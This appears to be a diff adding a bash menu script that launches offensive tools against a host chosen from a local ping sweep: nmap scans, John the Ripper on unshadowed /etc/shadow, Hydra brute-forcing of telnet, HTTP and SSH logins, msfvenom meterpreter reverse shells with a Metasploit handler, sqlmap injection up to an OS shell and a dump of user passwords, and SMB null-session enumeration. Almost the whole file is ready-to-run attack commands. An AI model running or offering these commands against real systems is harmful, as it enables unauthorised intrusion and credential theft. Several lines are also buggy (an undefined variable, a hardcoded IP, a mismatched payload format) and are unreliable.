@@ -1,0 +1,228 @@
+#!/bin/bash
+
+NONE='\033[00m'
+RED='\033[01;31m'
+GREEN='\033[01;32m'
+YELLOW='\033[01;33m'
+PURPLE='\033[01;35m'
+CYAN='\033[01;36m'
+WHITE='\033[01;37m'
+BOLD='\033[1m'
+UNDERLINE='\033[4mt'
+
+interface=$(ip -c=never -br -4 addr | rofi -dmenu -p "Which interface do you want to use?" | cut -d " " -f 1)
+file=$(mktemp)
+myip=$(ip -c=never -br -4 addr show dev $interface | awk '{print $3}' | cut -d '/' -f 1)
+netid=$(ip -c=never -br -4 addr show dev $interface | awk '{print $3}' | cut -d '.' -f 1-3)
+for ip in $(seq 1 254); do
+    	ping -c 1 -W 2 $netid.$ip | grep 'bytes from' | cut -d ' ' -f 4 | cut -d ':' -f 1 >> $file &
+done
+sleep 3
+file2=$(mktemp)
+grep -v $myip $file | sort -V > $file2
+scan=$(cat $file2 | rofi -dmenu -p "What IP do you want to use?")
+sudo rm $file
+sudo rm $file2
+
+syntax=$(echo -e "1.  Nmap\n2.  Password Cracking\n3.  Reverse Shell\n4.  SQLMap (Under Construction)\n5.  Dirb\n6.  Windows Shares/Null Sessions" | rofi -dmenu -style blue -p "What Program are you interested in?"| cut -d '.' -f 1)
+
+if [[ $syntax == "1" ]]; then
+	
+
+
+	nmapscan=$(echo -e  "1. Stealth Scan\n2. Quick Scan\n3. Full Scan\n4. UDP Quick Scan\n5. Full Scan+\n6. Is Someone Listening?" | rofi -dmenu -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
+  		
+	if [[ $nmapscan == "1" ]]; then
+		sudo mkdir -p "NmapScans/$scan/StealthScan"
+		sudo nmap -T1 -sS $scan -oX  "NmapScans/$scan/StealthScan/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/StealthScan/$scan.xml" -o "NmapScans/$scan/StealthScan/$scan.html"
+		sudo rm -f "NmapScans/$scan/StealthScan/$scan.xml"
+
+	elif [[ $nmapscan == "2" ]]; then
+		sudo mkdir -p "NmapScans/$scan/QuickScan"
+		sudo nmap -sC -sV $scan -oX  "NmapScans/$scan/QuickScan/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/QuickScan/$scan.xml" -o "NmapScans/$scan/QuickScan/$scan.html"
+		sudo rm -f "NmapScans/$scan/QuickScan/$scan.xml"
+	
+	elif [[ $nmapscan == "3" ]]; then
+		sudo mkdir -p "NmapScans/$scan/FullScan"
+		sudo nmap -sC -sV -p- $scan -oX  "NmapScans/$scan/FullScan/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/FullScan/$scan.xml" -o "NmapScans/$scan/FullScan/$scan.html"
+		sudo rm -f "NmapScans/$scan/FullScan/$scan.xml"
+
+	elif [[ $nmapscan == "4" ]]; then
+		sudo mkdir -p "NmapScans/$scan/QuickUDP"
+		sudo nmap -sU -sV $scan -oX  "NmapScans/$scan/QuickUDP/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/QuickUDP/$scan.xml" -o "NmapScans/$scan/QuickUDP/$scan.html"
+		sudo rm -f "NmapScans/$scan/QuickUDP/$scan.xml"
+
+	elif [[ $nmapscan == "5" ]]; then
+		sudo mkdir -p "NmapScans/$scan/FullScan+"
+		sudo nmap -sV -n -v -Pn -p- -T4 -A --open $scan -oX "NmapScans/$scan/FullScan+/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/FullScan+/$scan.xml" -o "NmapScans/$scan/FullScan+/$scan.html"
+		sudo rm -f "NmapScans/$scan/FullScan+/$scan.xml"
+
+	elif [[ $nmapscan == "6" ]]; then
+		sudo mkdir -p "NmapScans/$scan/SomeoneListening"
+		sudo nmap -sV --script=sniffer-detect $scan -oX "NmapScan/$scan/SomeoneListening/$scan.xml"
+		sudo xsltproc "NmapScans/$scan/SomeoneListening/$scan.xml" -o "NmapScans/$scan/SomeoneListening/$scan.html"
+		sudo rm -f "NmapScans/$scan/SomeoneListening/$scan.xml"
+
+
+	fi
+	xsltproc $scan.xml -o $scan.html
+	rm -f $scan.xml
+
+elif [[ $syntax == "2" ]]; then
+	
+	passcracker=$(echo -e "1. John\n2. Hydra" | rofi -dmenu -p "Which password cracking tool would you like to use?" | cut -d '.' -f 1)
+	if [[ $passcracker == "1" ]]; then
+		john=$(echo -e  "1. Encryption Formats\n2. Unshadow\n3. Brute Force Users List\n4. Brute Force Single User\n5. Show Cracked Passwords\n6. Dictionary Attack\n7. Default Wordlist\n8. Mangled Rules" | rofi -dmenu -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)
+		
+		if [[ $john == "1" ]]; then
+			sudo john --list=formats
+		elif [[ $john == "2" ]]; then
+			sudo unshadow /etc/passwd /etc/shadow > hashes
+		elif [[ $john == "3" ]]; then
+			sudo john -incremental -users:/path/to/x.user /path/to/pass.txt
+		elif [[ $john == "4" ]]; then
+			sudo john -incremental -users:victim
+		elif [[ $john == "5" ]]; then
+			sudo john --show hashes
+		elif [[ $john == "6" ]]; then
+			sudo john -wordlist=/file/to/pass.txt hashes
+		elif [[ $john == "7" ]]; then
+			sudo john -wordlist -users=victim1, victim2 hashes
+		elif [[ $john == "8" ]]; then
+			sudo john -wordlist=/path/to/pass.txt -rules hashes
+		fi
+
+	elif [[ $passcracker == "2" ]]; then
+		
+		userlist=$(ls -1 /usr/share/ncrack/*.usr /usr/share/seclists/Usernames/*.txt | rofi -dmenu -p "Which Username List would you like to use?")
+		passlist=$(ls -1 /usr/share/ncrack/*.* /usr/share/seclists/Passwords/*.txt /usr/share/seclists/Passwords/*/*.txt | sort | rofi -dmenu -p "Which Password List would you like to use?")
+		hydra=$(echo -e  "1. Telnet Crack\n2. HTTP Basic Auth Attack\n3. SSH Crack 2\n4. Login Crack" | rofi -dmenu -p "Which Hydra Attack would you like to use?" | cut -d '.' -f 1)
+
+		if [[ $hydra == "1" ]]; then
+			echo -e "sudo hydra -L $userlist -P $passlist telnet://$scan\n"
+			sudo hydra -L $userlist -P $passlist telnet://$scan
+		
+		elif [[ $hydra == "2" ]]; then
+			echo -e "sudo hydra -L $userlist -P $passlist http-get://$scan\n"
+			sudo hydra -L $userlist -P $passlist http-get://$scan
+		
+		elif [[ $hydra == "3" ]]; then
+			echo -e "sudo hydra $scan ssh -L $userlist -P $passlist -f -V\n"
+			sudo hydra $scan ssh -L $userlist -P $passlist -f -V
+		
+		elif [[ $hydra == "4" ]]; then
+			echo -e "sudo hydra $scan http-post-form '/login.php:usr=^USER^&pwd=^PASS^:invalid credentials' -L $user -P $passlist -f -V\n"
+			sudo hydra $scan http-post-form '/login.php:usr=^USER^&pwd=^PASS^:invalid credentials' -L $user -P $passlist -f -V
+		fi
+
+	fi
+
+elif [[ $syntax == "3" ]]; then
+	reverseshell=$(echo -e "1. PHP Reverse Shell\n2. Linux Reverse Shell\n3. Tomcat Reverse Shell" | rofi -dmenu -p "Which Reverse Shell would you like to use?" | cut -d '.' -f 1)
+	if [[ $reverseshell == "1" ]]; then
+		msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=443 -o shell.php
+		sleep 3
+		msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set payload php/meterpreter_reverse_tcp; run; exit -y"
+	
+	elif [[ $reverseshell == "2" ]]; then
+		port=$(sudo nmap -sS -p- 192.168.10.137 | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
+		msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport=$port -o shell  
+		sleep 3
+		msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
+	
+	elif [[ $reverseshell == "3" ]]; then
+		port=$(sudo nmap -sS -p- $scan | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d' | rofi -dmenu -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)
+		msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=127.0.0.1 lport=$port -f elf -o shell.war 
+		sleep 3
+		msfconsole -q -x "use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT $port; set payload linux/x64/meterpreter_reverse_tcp; run; exit -y"
+
+	fi
+
+
+
+elif [[ "$syntax" == "4" ]]; then
+
+	sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Uses\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database" | rofi -dmenu -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
+	if [[ $sqlmaps == "1" ]]; then
+		sqlmap -u http://$scan --os-shell
+	elif [[ $sqlmaps == "2" ]]; then
+	       	sqlmap -u http://$scan/view.php?id=1 -p id --technique=U
+	elif [[ $sqlmaps == "3" ]]; then
+		sqlmap -u http://$scan --data=POSTstring -p parameter
+	elif [[ $sqlmaps == "4" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U --banner
+	elif [[ $sqlmaps == "5" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U --banner -v3 --fresh-queries
+	elif [[ $sqlmaps == "6" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=u -users
+	elif [[ $sqlmaps == "7" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U -dbs
+	elif [[ $sqlmaps == "8" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U -D vicdb -tables
+	elif [[ $sqlmaps == "9" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U -D vicdb -T accounts -columns
+	elif [[ $sqlmaps == "10" ]]; then
+		sqlmap -u http://$scan/x.php?id=1 -p id --technique=U -D vicdb -T accounts -C users,passwords --dump
+	fi
+
+
+elif [[ $syntax == "5" ]]; then
+	dirb=$(echo -e "1.  Default Directory list\n2.  Choose a Directory List\n3.  Add File Extentions .php .old and .bak" | rofi -dmenu -p "Which Dirb Command would you like to use?" | cut -d '.' -f 1)
+
+        if [[ $dirb == "1" ]]; then
+		dirb http://$scan
+	
+	elif [[ $dirb == "2" ]]; then
+		dirlist=$(ls -1 /usr/share/dirb/wordlists/*/*.txt /usr/share/dirb/wordlists/*.txt /usr/share/dirbuster/wordlists/*.txt | sort | rofi -dmenu -p "Which Password List would you like to use?")
+		dirb http://$scan $dirlist
+	
+	elif [[ $dirb == "3" ]]; then
+		dirlist=$(ls -1 /usr/share/dirb/wordlists/*/*.txt /usr/share/dirb/wordlists/*.txt /usr/share/dirbuster/wordlists/*.txt | sort | rofi -dmenu -p "Which Password List would you like to use?")
+		dirb http://$scan $dirlist -X '.php,.old,.bak'
+        fi
+
+
+
+elif [[ "$syntax" == "6" ]]; then
+	nullsession=$(echo -e "1.  nblookup/netstat\n2.  Password Policy Info\n3. Enumerate Shares List\n4.  Enumerate Users List\n5.  Do All Above at once\n6.  Brute Forces Users\n7.  Service Available\n8.  Force no Pass\n9.  Exploit Null Sessions\n10. No Pass or User\n11. Not sure yet" | rofi -dmenu -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)
+	
+	if [[ $nullsession == "1" ]]; then
+		enum4linux -n $scan
+
+	elif [[ $nullsession == "2" ]]; then
+		enum4linux -P $scan
+	
+	elif [[ $nullsession == "3" ]]; then
+		enum4linux -S $scan
+	
+	elif [[ $nullsession == "4" ]]; then
+		enum4linux -U $scan
+	
+	elif [[ $nullsession == "5" ]]; then
+		enum4linux -a $scan
+	
+	elif [[ $nullsession == "6" ]]; then
+		enum4linux -s /usr/share/enum4linux/share-list.txt $scan
+	
+	elif [[ $nullsession == "7" ]]; then
+		smbclient -L //$scan
+
+	elif [[ $nullsession == "8" ]]; then
+		smbclient -L //$scan -N
+
+	elif [[ $nullsession == "9" ]]; then
+		smbclient //$scan/IPC$ -N
+
+	elif [[ $nullsession == "10" ]]; then
+		smbclient -L WORKGROUP -i $scan -N -U ' '
+
+	elif [[ $nullsession == "11" ]]; then
+		smbclient \\\\\\\\\\\\$scan\\\\\\WorkSharing -N
+	fi
+
+fi
